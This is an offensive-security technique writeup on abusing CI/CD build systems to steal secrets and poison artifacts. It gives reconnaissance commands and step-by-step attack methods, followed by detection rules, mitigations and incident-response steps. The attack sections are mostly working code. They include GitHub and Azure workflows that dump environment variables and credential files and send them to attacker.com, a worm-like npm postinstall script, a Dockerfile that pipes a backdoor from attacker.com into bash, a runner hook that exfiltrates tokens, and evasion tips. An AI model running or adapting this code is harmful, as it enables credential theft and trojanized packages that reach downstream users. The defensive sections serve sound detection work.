# [SUPPLY-CHAIN-002]: Build System Access Abuse

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | SUPPLY-CHAIN-002 |
| **MITRE ATT&CK v18.1** | [Compromise Software Dependencies and Development Tools (T1195.001)](https://attack.mitre.org/techniques/T1195/001/) |
| **Tactic** | Resource Development |
| **Platforms** | Entra ID / DevOps (Azure DevOps, GitHub, GitLab CI) |
| **Severity** | Critical |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | GitHub Actions (all), Azure DevOps (all), GitLab CI (all), Jenkins (all) |
| **Patched In** | N/A - requires architectural changes to build infrastructure |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

- **Concept:** Build system access abuse occurs when attackers gain unauthorized access to CI/CD build runners, agents, or build infrastructure (GitHub Actions runners, Azure DevOps agents, GitLab runners, Jenkins nodes) and abuse this access to execute arbitrary code, steal secrets, or poison artifacts during the build process. Unlike repository compromise (which injects malicious code into source), this attack abuses the build execution environment itself to compromise the build pipeline after legitimate code has been committed. Attackers can inject malicious build steps, exfiltrate environment secrets, modify compiled artifacts, or install persistent backdoors on build agents.

- **Attack Surface:** GitHub Actions runners (GitHub-hosted and self-hosted), Azure DevOps build agents (Microsoft-hosted and self-hosted), GitLab CI runners, Jenkins build nodes, build caches, artifact repositories, environment variables, workload identity tokens, service account credentials, runner configuration files.

- **Business Impact:** **Poisoned build artifacts distributed to end users.** Attackers can modify compiled binaries, insert malicious dependencies, alter configuration files, or inject backdoors into final release artifacts. All downstream consumers that pull these poisoned artifacts become compromised. This can affect hundreds of thousands of end users simultaneously, enabling mass distribution of malware, ransomware, or trojanized software. Additionally, secrets stored in build environments (cloud credentials, API keys, certificates) can be exfiltrated for lateral movement across infrastructure.

- **Technical Context:** Build system access typically takes 5-30 minutes once initial foothold is achieved. Detection likelihood is medium if environment variable logging is enabled but can be low if logs are sanitized or deleted post-execution. Common indicators include unusual build job execution, access to artifact storage, modifications to runner configuration, and exfiltration of secrets.

### Operational Risk

- **Execution Risk:** Medium-High - Requires valid credentials, workflow dispatch permissions, or self-hosted runner access. Once achieved, impact is guaranteed and affects all downstream artifact consumers.
- **Stealth:** Medium - Build logs are archived and searchable; malicious artifacts may be detected by SBOM scanning or binary analysis. However, poisoned artifacts in early stages can propagate undetected.
- **Reversibility:** Partial - Malicious artifacts can be removed from registries, but if already distributed to end users, impact is difficult to contain.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS v1.4.0 – CD-1.1 | Build pipelines must enforce separation of duties between code review and artifact release. |
| **DISA STIG** | AC-3(7) – Separation of Duties | Build infrastructure must prevent operators from both approving and executing deployments. |
| **CISA SCuBA** | SCUBA-GH-A2-01 | GitHub Actions runners must be isolated and restricted to approved operations. |
| **NIST 800-53** | SI-7(14) – Integrity Monitoring | Build system must monitor and alert on unauthorized modifications to artifacts. |
| **GDPR** | Art. 32 – Security of Processing | Technical measures must protect the integrity of automated processing systems. |
| **DORA** | Art. 16 – Operational Resilience Testing | Financial entities must test CI/CD supply chain security controls regularly. |
| **NIS2** | Art. 21 – Basic Cyber Hygiene | Critical infrastructure operators must secure build infrastructure against compromise. |
| **ISO 27001** | A.14.2.1 – Change Management | Build systems must have change control and approval processes. |
| **ISO 27005** | Risk: Compromise of Build Infrastructure | Assess risks of attackers poisoning artifacts through compromised build systems. |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** Self-hosted runner admin, build agent admin, service account with write access to artifact repositories, workflow dispatch permissions. GitHub Actions: `actions:use` permission. Azure DevOps: `Build.Admin` or `Build.QueueBuildForMe` permission.

- **Required Access:** Network access to CI/CD infrastructure. Valid authentication to build agent (SSH key, credentials, workload identity token). Write access to artifact repositories (npm, Docker, NuGet, Maven, etc.). Access to runner configuration files and environment setup scripts.

**Supported Versions:**
- **GitHub:** Actions (all versions)
- **Azure DevOps:** Pipelines (all versions, including Server 2019+)
- **GitLab:** CI Runners (all versions 13.0+)
- **Jenkins:** (all versions, especially with GitOps integrations)

- **Tools:**
    - [GitHub CLI (gh)](https://github.com/cli/cli) (Version 2.0+)
    - [Azure Pipelines Agent](https://github.com/Microsoft/azure-pipelines-agent) (Version 2.190+)
    - [Docker](https://www.docker.com/) (Version 19.0+)
    - [npm / yarn / pnpm](https://www.npmjs.com/) (all versions)
    - [curl / wget](https://curl.se/) (all versions)

---

## 3. ENVIRONMENTAL RECONNAISSANCE

#### GitHub Actions Runner Reconnaissance

```bash
# Enumerate GitHub Actions runners in organization
gh api orgs/{org}/actions/runners --paginate | jq '.runners[] | {name, status, labels, runner_group_id}'

# Check runner labels (self-hosted runners expose OS and capabilities)
gh api repos/{owner}/{repo}/actions/runners --paginate | jq '.runners[] | select(.os == "self-hosted")'

# List workflow files that use self-hosted runners
gh api repos/{owner}/{repo}/contents/.github/workflows --paginate | jq '.[] | select(.name | endswith(".yml"))'

# Check recent workflow execution logs
gh run list --repo {owner}/{repo} --limit 10 --json 'databaseId,status,createdAt,conclusion' -q '.[] | "\(.databaseId) - \(.status) - \(.conclusion)"'
```

**What to Look For:**
- Self-hosted runners with public IP addresses (directly exploitable)
- Runners with high-privilege labels (`windows`, `macos`, `large-runner`)
- Runners that have been idle or offline for extended periods (possibly compromised and being hidden)
- Workflows that execute on `pull_request_target` with self-hosted runners (RCE vector)

#### Azure DevOps Build Agent Reconnaissance

```bash
# List all build agents in project
az pipelines agent list --organization "https://dev.azure.com/{org}" --project "{project}"

# Check self-hosted agent capabilities
az pipelines agent list --organization "https://dev.azure.com/{org}" --project "{project}" \
  --query "[?type == 'self-hosted'].{name: name, status: status, version: version, capabilities: userCapabilities}"

# Enumerate recent build jobs
az pipelines build list --organization "https://dev.azure.com/{org}" --project "{project}" \
  --top 20 --query "[].{id: id, status: status, queueTime: queueTime}"
```

**What to Look For:**
- Agents running on low-security networks (DMZ, guest networks)
- Agents with capabilities that shouldn't exist (e.g., custom `PrivilegeLevel=Admin`)
- Agents that haven't reported status in > 30 days (possible compromise)
- Build jobs with unusually long execution times

#### Linux/Container Runtime Reconnaissance

```bash
# Check Docker daemon configuration (if builds run in containers)
docker info | grep -E "Storage Driver|Registry|Security Options"

# List recent container images (look for suspicious base images)
docker images --format "{{.Repository}}:{{.Tag}}" | head -20

# Check container registries accessible from build environment
curl -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
  https://kubernetes.default.svc/api/v1/secrets?namespace=default | jq '.items[] | select(.type == "Opaque")'
```

**What to Look For:**
- Custom container registries with write access
- Suspicious base images from third-party registries
- Mounted secrets or environment files that expose credentials

---

## 4. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Self-Hosted Runner Compromise (Direct Access)

**Supported Versions:** GitHub Actions (all), Azure DevOps (all), GitLab CI (all)

#### Step 1: Enumerate and Locate Vulnerable Self-Hosted Runner

**Objective:** Identify self-hosted runners that can be exploited via network access or compromised credentials.

**Command (GitHub):**
```bash
# List all self-hosted runners accessible to compromised account
gh api orgs/{org}/actions/runners --paginate | jq '.runners[] | select(.status == "idle" or .status == "offline") | {name, os, labels, ip_address}'

# Check runner group permissions (determine who can use the runner)
gh api orgs/{org}/actions/runner-groups --paginate | jq '.runner_groups[] | {name, visibility, selected_repositories_url}'
```

**Expected Output:**
```json
{
  "name": "self-hosted-ubuntu-001",
  "os": "linux",
  "labels": [
    "self-hosted",
    "linux",
    "x64",
    "docker",
    "npm"
  ],
  "ip_address": "192.168.1.100"
}
```

**What This Means:**
- Runner is self-hosted (hosted on attacker infrastructure or compromised internal server)
- Runner is capable of Docker, npm operations (can execute arbitrary code, install malicious packages)
- IP address reveals runner location (may be internally networked)

**Command (Azure DevOps):**
```bash
# List all personal access tokens visible to current user (service account enumeration)
az devops service-endpoint list --organization "https://dev.azure.com/{org}" --project "{project}" \
  --query "[?type == 'self-hosted-agent'].authentication"

# Check agent pool permissions
az pipelines agent-pool list --organization "https://dev.azure.com/{org}" \
  --query "[].{name: name, size: size, isHosted: isHosted}"
```

**OpSec & Evasion:**
- Self-hosted runner enumeration is visible in organization audit logs
- Detection likelihood: **Medium** - Enumeration queries are logged but may not trigger immediate alerts

#### Step 2: Gain Access to Build Environment (Phishing or Token Theft)

**Objective:** Obtain valid workflow dispatch token or build agent credentials.

**Command (Token Theft from CI/CD Logs):**
```powershell
# If attacker can read build logs, extract embedded secrets
$logContent = Get-Content "C:\agents\{agent-name}\logs\job_xyz.log" -Raw
$secrets = $logContent | Select-String -Pattern 'TOKEN|PASSWORD|SECRET|KEY' -AllMatches

# Exfiltrate secrets
$secrets | Out-File "C:\temp\exfil.txt"
curl -d @C:\temp\exfil.txt https://attacker.com/webhook
```

**Command (Workflow Dispatch Token Abuse):**
```bash
# If attacker has PAT with `workflow` scope, trigger build manually
gh workflow run {workflow-name} --repo {owner}/{repo} \
  --ref main \
  --inputs '{"secret_to_exfil": "true"}'
```

**Expected Output (Success):**
```
✓ Triggered {workflow-name} (ID: 123456789)
```

**OpSec & Evasion:**
- Using legitimate workflow dispatch is less suspicious than direct build agent access
- Trigger during business hours to blend with normal activity
- Detection likelihood: **Low** if activity appears to come from legitimate account

#### Step 3: Execute Malicious Build Step and Exfiltrate Secrets

**Objective:** Inject arbitrary commands into running build job to steal credentials and secrets.

**Command (GitHub Actions - Via Pull Request):**
```yaml
# Malicious PR with workflow that exfiltrates secrets
name: Exfiltrate Build Secrets
on: [workflow_dispatch, pull_request_target]

jobs:
  exfil:
    runs-on: ubuntu-latest  # Or self-hosted runner
    steps:
      - name: Checkout code
        uses: actions/checkout@v3
        with:
          ref: ${{ github.event.pull_request.head.sha }}
          
      - name: Steal Secrets
        run: |
          # Dump all environment variables (includes GitHub tokens, secrets)
          env > /tmp/env_dump.txt
          
          # Harvest credentials from common locations
          cat ~/.git-credentials ~/.netrc ~/.ssh/id_* 2>/dev/null | base64 -w0 > /tmp/creds.b64
          
          # Extract secrets from docker config
          cat ~/.docker/config.json 2>/dev/null | base64 -w0 >> /tmp/creds.b64
          
          # Extract npm tokens
          cat ~/.npmrc 2>/dev/null | base64 -w0 >> /tmp/creds.b64
          
          # Exfiltrate via webhook
          curl -X POST \
            -d @/tmp/env_dump.txt \
            -H "Content-Type: text/plain" \
            https://attacker-webhook.com/github-exfil
            
          # Exfiltrate base64-encoded credentials
          curl -X POST \
            -d "creds=$(cat /tmp/creds.b64)" \
            https://attacker-webhook.com/creds-exfil
```

**Expected Output (Exfiltrated Secrets):**
```
GITHUB_TOKEN=ghu_abcdefghijklmnop
NPM_TOKEN=npm_abcdefghijklmnop
DOCKER_PASSWORD=mypassword123
AWS_ACCESS_KEY_ID=AKIA...
KUBECONFIG=/tmp/kubeconfig.yaml
```

**Command (Azure Pipelines - Via Script Step):**
```yaml
trigger:
  - main

pool:
  vmImage: 'ubuntu-latest'

steps:
- script: |
    # Dump all environment variables
    env | grep -E "TOKEN|SECRET|KEY|PASSWORD" | tee /tmp/secrets.txt
    
    # Exfiltrate via curl
    curl -X POST -d @/tmp/secrets.txt $(WEBHOOK_URL)
    
    # Download and execute attacker payload
    wget https://attacker.com/payload.sh -O /tmp/payload.sh
    chmod +x /tmp/payload.sh
    /tmp/payload.sh
    
  displayName: 'Build Step'
  env:
    WEBHOOK_URL: $(EXFIL_WEBHOOK)
```

**What This Means:**
- All environment variables (including `GITHUB_TOKEN`, `SYSTEM_ACCESSTOKEN`) are exfiltrated
- Credentials are valid and can be used to authenticate to downstream services
- Attacker can use stolen tokens to push malicious artifacts, deploy infrastructure, etc.

**OpSec & Evasion:**
- Encode sensitive data (base64) to bypass simple text scanning
- Use `2>/dev/null` to suppress errors and hide command failures from logs
- Clear history: `history -c && history -w`
- Delete exfiltration artifacts: `rm /tmp/env_dump.txt /tmp/creds.b64`
- Detection likelihood: **High** - Build logs capture all stdout/stderr output

#### Step 4: Poison Artifact Repository and Distribute

**Objective:** Use exfiltrated credentials to publish malicious artifacts to npm, Docker Hub, or other package registries.

**Command (npm Package Poisoning):**
```bash
# Using stolen npm token, publish malicious package version
npm login --registry https://registry.npmjs.org --auth-token ${STOLEN_NPM_TOKEN}

# Modify package.json to add postinstall script
cat >> package.json << 'EOF'
{
  "name": "popular-package",
  "version": "1.2.4-patch",
  "postinstall": "node setup_bun.js"
}
EOF

# Create malicious postinstall script
cat > setup_bun.js << 'EOF'
const https = require('https');
const os = require('os');

// Exfiltrate environment to attacker server
const payload = JSON.stringify({
  env: process.env,
  user: os.userInfo(),
  cwd: process.cwd()
});

https.request({
  hostname: 'attacker.com',
  path: '/install',
  method: 'POST',
  headers: { 'Content-Type': 'application/json' }
}, (res) => {}).end(payload);

// Propagate malware: modify other packages
const fs = require('fs');
const path = require('path');
const nodeModules = path.join(process.cwd(), 'node_modules');
if (fs.existsSync(nodeModules)) {
  fs.readdirSync(nodeModules).forEach(pkg => {
    const pkgJsonPath = path.join(nodeModules, pkg, 'package.json');
    if (fs.existsSync(pkgJsonPath)) {
      // Inject malicious postinstall into all dependencies
      const pkgJson = JSON.parse(fs.readFileSync(pkgJsonPath, 'utf8'));
      pkgJson.postinstall = 'node -e "eval(Buffer.from(process.env.MALWARE_PAYLOAD, \"base64\").toString())"';
      fs.writeFileSync(pkgJsonPath, JSON.stringify(pkgJson));
    }
  });
}
EOF

# Publish poisoned package
npm publish --registry https://registry.npmjs.org
```

**Expected Output (Success):**
```
npm notice Publishing package to registry
+ popular-package@1.2.4-patch
```

**What This Means:**
- Malicious package is published to npm public registry
- Any developer running `npm install popular-package@1.2.4-patch` automatically executes `setup_bun.js`
- Postinstall script exfiltrates environment and propagates to all other installed packages
- Worm-like behavior: infection spreads to entire dependency tree

**Command (Docker Image Poisoning):**
```bash
# Using stolen Docker registry credentials
docker login -u ${STOLEN_USERNAME} -p ${STOLEN_PASSWORD} docker.io

# Pull legitimate base image
docker pull docker.io/library/node:18-alpine

# Create malicious Dockerfile
cat > Dockerfile << 'EOF'
FROM docker.io/library/node:18-alpine
RUN apk add --no-cache curl bash && \
    curl https://attacker.com/backdoor.sh | bash && \
    rm -f /var/log/apk.log /var/cache/apk/* /root/.bash_history
WORKDIR /app
COPY . .
RUN npm install && npm run build
CMD ["npm", "start"]
EOF

# Build and tag
docker build -t docker.io/vulnerable-app:1.2.0 .

# Push to registry (overwrites existing tag)
docker push docker.io/vulnerable-app:1.2.0
```

**OpSec & Evasion:**
- Increment minor/patch version to appear as legitimate update
- Use stolen legitimate credentials (appears as authorized push)
- Embed backdoor in `RUN` command during build (harder to detect than exec)
- Detection likelihood: **Medium** - Registry logs show push, but source IP may appear legitimate

---

### METHOD 2: GitHub Actions Secrets Exfiltration (Zero-Click)

**Supported Versions:** GitHub Actions (all versions)

#### Step 1: Create Pull Request with Malicious Workflow

**Objective:** Inject malicious GitHub Actions workflow that executes with repository secrets.

**Command:**
```bash
# Create feature branch with malicious workflow
git checkout -b exploit/exfil-secrets

# Create malicious workflow that accesses pull_request_target event
mkdir -p .github/workflows
cat > .github/workflows/steal-secrets.yml << 'EOF'
name: Collect Build Data
on: 
  pull_request_target:  # Runs on base branch with full access to secrets
    types: [opened, synchronize]

jobs:
  analyze:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
        with:
          ref: ${{ github.event.pull_request.base.ref }}  # Checkout main, not PR head
          
      - name: Analyze dependency tree
        run: |
          # Legitimate-looking step that exfiltrates secrets
          npm install --dry-run 2>&1 | head -100
          
      - name: Upload analysis
        run: |
          # Exfiltrate all secrets to webhook
          curl -X POST https://attacker.com/api/webhook \
            -H "Content-Type: application/json" \
            -d "{
              \"github_token\": \"${{ secrets.GITHUB_TOKEN }}\",
              \"npm_token\": \"${{ secrets.NPM_TOKEN }}\",
              \"docker_password\": \"${{ secrets.DOCKER_PASSWORD }}\",
              \"environment\": \"$(env | base64 -w0)\"
            }"
EOF

# Commit and push
git add .github/workflows/steal-secrets.yml
git commit -m "Add dependency analysis workflow"
git push origin exploit/exfil-secrets

# Create PR (can be done via API or web UI)
gh pr create --base main --head exploit/exfil-secrets \
  --title "Improve build analysis" \
  --body "Adds automated dependency tree analysis to catch supply chain issues early."
```

**Expected Output:**
```
Workflow triggered on pull_request_target event
Exfiltrated GITHUB_TOKEN=ghu_xxxxxxxxxxxxxxxx
Exfiltrated NPM_TOKEN=npm_xxxxxxxxxxxxxxxx
```

**What This Means:**
- `pull_request_target` event runs the workflow from the base branch (main) but with the PR code checked out
- This allows execution of arbitrary code from the PR with access to repository secrets
- Secrets are directly interpolated into the curl command and sent to attacker server

**OpSec & Evasion:**
- Workflow names sound legitimate ("Analyze", "Validate", "Security Check")
- Embed malicious steps between legitimate-sounding steps
- Use `${{ secrets.VAR }}` syntax which doesn't appear in logs (logs show `***` placeholders)
- Detection likelihood: **Medium-High** - Unusual network calls to external domains are logged

#### Step 2: Wait for Workflow Approval and Execution

**Objective:** If PR requires approval, wait for maintainer to approve (or use social engineering).

**Command:**
```bash
# Monitor PR approval status
gh pr view {pr-number} --repo {owner}/{repo} --json reviewDecision,statusCheckRollup

# Alternatively, if attacker can dismiss reviews or has admin access:
gh pr review {pr-number} --approve --repo {owner}/{repo}

# Trigger manual workflow execution (if PR requires approval gate)
gh workflow run steal-secrets.yml --repo {owner}/{repo} \
  -f pr_number="{pr-number}"
```

---

### METHOD 3: Self-Hosted Runner Credential Injection

**Supported Versions:** GitHub Actions (self-hosted), Azure DevOps (self-hosted agents)

#### Step 1: Compromise Runner Configuration Files

**Objective:** Modify runner startup scripts to inject malicious credential exfiltration hooks.

**Command (GitHub Actions Runner on Linux):**
```bash
# Access runner directory (typically /home/runner-user/actions-runner)
cd /home/runner-user/actions-runner

# Locate runner configuration
cat .env
# OUTPUT:
# RUNNER_ALLOWUSERSWITCHINGACCOUNTS=false
# GITHUB_URL=https://github.com
# GITHUB_RUNNER_REGISTRATION_TOKEN=xxxxxxxxxxxx

# Modify runner startup script to exfiltrate tokens
cat > run_exfil.sh << 'EOF'
#!/bin/bash
# Original runner startup
/home/runner-user/actions-runner/run.sh &
RUNNER_PID=$!

# Inject credential exfiltration loop
while true; do
  sleep 300  # Every 5 minutes
  
  # Extract runner token from process environment
  RUNNER_TOKEN=$(cat /proc/$RUNNER_PID/environ | tr '\0' '\n' | grep RUNNER_TOKEN)
  
  # Exfiltrate via webhook
  curl -X POST https://attacker.com/token \
    -d "runner_token=${RUNNER_TOKEN}"
    
  # Also grab job-specific tokens from build directory
  find /home/runner-user -name "job_*.json" -exec cat {} \; | \
    curl -d @- https://attacker.com/job-tokens
done
EOF

chmod +x run_exfil.sh

# Modify runner config to use malicious startup script
# Replace runner startup in systemd or supervisor config
sudo systemctl edit actions.runner.myorg-myrepo.runner
# [Service]
# ExecStart=/home/runner-user/actions-runner/run_exfil.sh  # <-- injected
```

**Expected Output (Continuous Credential Exfiltration):**
```
Exfiltrated RUNNER_TOKEN=...
Exfiltrated GITHUB_TOKEN (from job) = ghu_...
```

**OpSec & Evasion:**
- Malicious script runs as background process, hidden from normal runner logs
- Exfiltration happens every 5 minutes (blends with normal network traffic)
- Detection likelihood: **Medium** - Runner configuration changes are visible in Git history if tracked

---

## 5. SPLUNK DETECTION RULES

#### Rule 1: Detect Workflow Dispatch to Self-Hosted Runner with Secret Exfiltration

**Rule Configuration:**
- **Required Index:** github_enterprise (if GitHub Enterprise logging)
- **Required Sourcetype:** github:actions:workflow
- **Required Fields:** workflow_name, runner_type, script, step_name
- **Alert Threshold:** > 0 events with suspicious keywords
- **Applies To Versions:** GitHub Actions (all)

**SPL Query:**
```spl
index=github_enterprise 
  sourcetype="github:actions:workflow"
  (
    step_name IN ("*secret*", "*credential*", "*exfil*", "*dump*", "*token*", "*password*")
    OR script CONTAINS ("env |", "printenv", "declare -p", "export", "base64", "curl", "wget", "-d @")
  )
  AND runner_type=self-hosted
| stats count by workflow_name, step_name, runner_type, timestamp
| where count > 0
```

**What This Detects:**
- Workflow steps with names indicating credential access
- Scripts using `env`, `printenv`, `declare` to dump environment variables
- Exfiltration patterns: `curl -d @`, `| base64`, `| wget`
- Self-hosted runners used with suspicious workflows

**Manual Configuration Steps:**
1. Log into Splunk Web → **Search & Reporting**
2. Click **Settings** → **Searches, reports, and alerts**
3. Click **New Alert**
4. Paste the SPL query above
5. Set **Trigger Condition** to `Alert when number of events is greater than 0`
6. Configure **Action** → Send email to SOC team

---

## 6. MICROSOFT SENTINEL DETECTION

#### Query 1: Detect Suspicious Build Job Execution (Azure DevOps)

**Rule Configuration:**
- **Required Table:** AzureActivity, AzureDevOpsAudit
- **Required Fields:** OperationName, Caller, Properties.jobName, Properties.environment
- **Alert Severity:** High
- **Frequency:** Run every 5 minutes
- **Applies To Versions:** Azure DevOps Services (all)

**KQL Query:**
```kusto
AzureActivity
| where TimeGenerated > ago(5m)
| where OperationNameValue in (
    'Microsoft.VisualStudio/pipelines/write',
    'Microsoft.VisualStudio/build/queue'
  )
| extend Properties = parse_json(tostring(Properties))
| extend JobName = tostring(Properties.jobName), JobScript = tostring(Properties.jobScript)
| where JobName has_any ('exfil', 'secret', 'cred', 'token', 'dump', 'steal') or
        JobScript has_any ('curl -d', 'wget --post', '| base64', 'env |')
| project TimeGenerated, Caller, OperationNameValue, JobName, JobScript
| summarize SuspiciousJobs = count() by Caller
| where SuspiciousJobs > 0
```

**What This Detects:**
- Azure DevOps build jobs with suspicious names or scripts
- Exfiltration patterns in build definitions
- Multiple suspicious jobs from same caller (batch compromise)

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `Suspicious Build Job with Credential Exfiltration`
   - Severity: `High`
5. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `5 minutes`
6. **Incident settings Tab:**
   - Enable **Create incidents**
7. Click **Review + create**

---

## 7. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

* **Enforce IP allowlisting for self-hosted runners:**
    
    **GitHub:**
    - Go to **Organization Settings** → **Security** → **Runner security**
    - Enable **IP allowlist** → Add approved IP ranges only
    - Example: `10.0.0.0/8`, `203.0.113.0/24` (internal networks only)
    
    **Azure DevOps:**
    - Go to **Project Settings** → **Agent pools**
    - Select agent pool → **Security** → **Allowed IP addresses**
    - Restrict to internal network ranges
    
    **Validation Command:**
    ```bash
    # Verify IP allowlist is enforced
    gh api orgs/{org}/actions/runner-groups --query '.runner_groups[] | {name, ip_allowlist}'
    ```

* **Implement secrets rotatio**n on all CI/CD credentials (90-day max lifetime):**
    
    **GitHub:**
    1. Go to **Repository** → **Settings** → **Secrets and variables** → **Actions**
    2. For each secret: Set to expire in 90 days maximum
    3. Automate rotation via Azure Key Vault or AWS Secrets Manager
    
    **Azure DevOps:**
    1. Go to **Project Settings** → **Service connections**
    2. For each service connection: Enable **Auto refresh** (if available)
    3. Set credential lifetime to 90 days
    
    **Validation Command:**
    ```bash
    # List expiring secrets
    curl -H "Authorization: token $GITHUB_TOKEN" \
      "https://api.github.com/repos/{owner}/{repo}/secrets" | \
      jq '.[] | select(.expires_at < now | 90 * 86400) | {name, expires_at}'
    ```

* **Restrict GitHub Actions workflow permissions to read-only by default:**
    
    **Manual Steps:**
    1. Go to **Repository** → **Settings** → **Actions** → **General**
    2. Under **Workflow permissions**, select **Read repository contents**
    3. **Disable:**
       - Allow GitHub Actions to create and approve pull requests
       - Allow GitHub Actions to auto-merge pull requests
    4. Enable: **Require approval for all outside collaborators**
    
    **YAML Configuration (for all workflows):**
    ```yaml
    permissions:
      contents: read
      pull-requests: read
      # NO write, admin, or workflow permissions by default
    ```

* **Implement artifact signing and verification (SLSA Framework):**
    
    **GitHub:**
    ```yaml
    name: Build and Sign Artifact
    on: [push]
    jobs:
      build:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/checkout@v3
          - name: Build artifact
            run: npm run build && sha256sum dist/* > CHECKSUMS.txt
            
          - name: Sign SBOM
            uses: slsa-framework/slsa-github-generator/.github/workflows/generator_container_slsa3@v1.4.0
            with:
              image: ghcr.io/${{ github.repository }}
              image-digest: ${{ needs.build.outputs.digest }}
              registry-username: ${{ github.actor }}
              registry-password: ${{ secrets.GITHUB_TOKEN }}
              slsa-layout-file: build/slsa-provenance.json
    ```
    
    **Verification (on consumer side):**
    ```bash
    # Download and verify SLSA provenance
    slsa-verify verify-artifact myapp-1.2.0.tar.gz \
      --provenance-path myapp-1.2.0.tar.gz.slsa
    ```

#### Priority 2: HIGH

* **Implement Build Artifact Scanning (SBOM + Malware detection):**
    
    **GitHub Actions:**
    ```yaml
    - name: Generate SBOM
      uses: CycloneDX/cyclonedx-npm@v2
      with:
        output-file: sbom.json
        
    - name: Scan SBOM for known vulnerabilities
      run: |
        npm install -g @cyclonedx/npm
        grype sbom.json --output=json > vulnerabilities.json
        if grep -q "CRITICAL" vulnerabilities.json; then
          exit 1
        fi
    ```

* **Isolate self-hosted runners in separate network segment:**
    
    **Network Configuration:**
    - Deploy self-hosted runners on isolated subnet (DMZ)
    - Restrict egress to approved registries only (npm, Docker Hub, Maven Central)
    - Block outbound to `*.com`, `*.net` except whitelisted domains
    - Example:
      - ALLOW: registry.npmjs.org, index.docker.io, repo.maven.apache.org
      - BLOCK: All other external destinations

---

## 8. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)

* **Build Logs:**
  - Unusual commands: `curl`, `wget`, `nc`, `socat` in build steps
  - Environment variable dumps: `env |`, `printenv`, `declare -p`
  - Exfiltration patterns: `| base64 -w0`, `-d @`, `| cut -d:`
  - Modifications to artifact before upload

* **Artifact Repository:**
  - New package versions published from unusual IP addresses
  - Packages with identical functionality but increased file size
  - Packages with `postinstall` or `preinstall` scripts
  - Docker images with suspicious layers

* **Workflow Files:**
  - New workflows with unusual names (`security-check.yml`, `analyze.yml`)
  - Workflows using `pull_request_target` trigger
  - `curl` or `wget` commands with `https://attacker.com`
  - Environment variable interpolation into external requests

#### Forensic Artifacts

* **Git Repository:**
  - `.github/workflows/*.yml` files modified recently
  - Commits adding new workflows or modifying build scripts
  
* **Build Agent:**
  - `/var/log/build-job-*.log` contains exfiltration commands
  - `~/.docker/config.json` shows login from unusual IP
  - `~/.ssh/config` contains new host entries
  
* **Cloud Logs:**
  - AzureActivity: `Microsoft.VisualStudio/pipelines/execute` with suspicious job names
  - GitHub Audit Log: Workflow files created or modified by non-developers

#### Response Procedures

1.  **Isolate:**
    ```bash
    # Immediately revoke all build-related secrets
    gh secret delete NPM_TOKEN --repo {owner}/{repo}
    gh secret delete DOCKER_PASSWORD --repo {owner}/{repo}
    gh secret delete AWS_CREDENTIALS --repo {owner}/{repo}
    
    # Disable self-hosted runners
    gh api repos/{owner}/{repo}/actions/runners/{runner-id} -X DELETE
    
    # Revoke build agent credentials
    az pipelines agent delete --organization "https://dev.azure.com/{org}" --id {agent-id} --yes
    ```

2.  **Collect Evidence:**
    ```bash
    # Export all workflow execution logs
    gh run list --repo {owner}/{repo} --json databaseId | jq '.[] | .databaseId' | \
      while read run_id; do
        gh run download $run_id --repo {owner}/{repo} -D /tmp/evidence
      done
    
    # Export GitHub audit logs for the affected timeframe
    curl -H "Authorization: token $GITHUB_TOKEN" \
      "https://api.github.com/orgs/{org}/audit-log?include=all&phrase=created:>2026-01-01" > \
      /tmp/audit-log-full.json
    ```

3.  **Remediate:**
    ```bash
    # Revert malicious workflow changes
    git revert <malicious-commit-hash>
    git push origin main
    
    # Delete poisoned artifact versions from registry
    npm unpublish my-package@1.2.4 --force  # npm
    docker image rm myregistry.azurecr.io/myapp:1.2.4  # Docker
    
    # Rotate all credentials with fresh values
    # (Generate new tokens in GitHub/Azure DevOps/npm/Docker)
    
    # Quarantine poisoned artifacts
    # Download and archive all versions published during compromise window
    # Scan with antivirus and YARA rules for malware signatures
    ```

---

## 9. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | **[REC-CLOUD-002]** | ROADtools enumeration of Azure DevOps service connections and pipelines |
| **2** | **Initial Access** | **[IA-PHISH-001]** | Device code phishing to compromise developer credentials |
| **3** | **Credential Access** | **[CA-OAUTH-001]** | OAuth token theft or consent abuse to obtain workflow dispatch permissions |
| **4** | **Lateral Movement** | **[SUPPLY-CHAIN-001]** | Pipeline Repository Compromise - inject malicious workflow into repo |
| **5** | **Current Step** | **[SUPPLY-CHAIN-002]** | **Build System Access Abuse - exfiltrate secrets, poison artifacts** |
| **6** | **Impact** | **[SUPPLY-CHAIN-003]** | Artifact Repository Poisoning - distribute trojanzied packages to end users |
| **7** | **Persistence** | **[PERSIST-002]** | Create backdoored OAuth app or service principal for future access |

---

## 10. REAL-WORLD EXAMPLES

#### Example 1: GhostAction Campaign (September 2025)

- **Target:** 817 GitHub repositories across 327 users
- **Timeline:** Malicious commits injected and exfiltrated 3,325 secrets over several days
- **Technique Status:** Attackers compromised GitHub accounts and injected workflows titled "Add Github Actions Security workflow" into build pipelines. Workflows extracted PyPI, npm, and DockerHub tokens.
- **Impact:** 100+ teams exfiltrated DockerHub credentials, GitHub tokens, npm tokens, PyPI API tokens, AWS access keys, database credentials, and Cloudflare API tokens. Attackers could push malicious images to Docker registries and malicious packages to npm/PyPI.
- **Detection:** GitGuardian detected patterns and notified affected repositories. 100+ repositories had changes reverted within 24 hours.
- **Reference:** [StepSecurity - GhostAction Campaign](https://www.stepsecurity.io/blog/ghostaction-campaign-over-3-000-secrets-stolen-through-malicious-github-workflows)

#### Example 2: s1ngularity Attack - Nx Build System (August 2025)

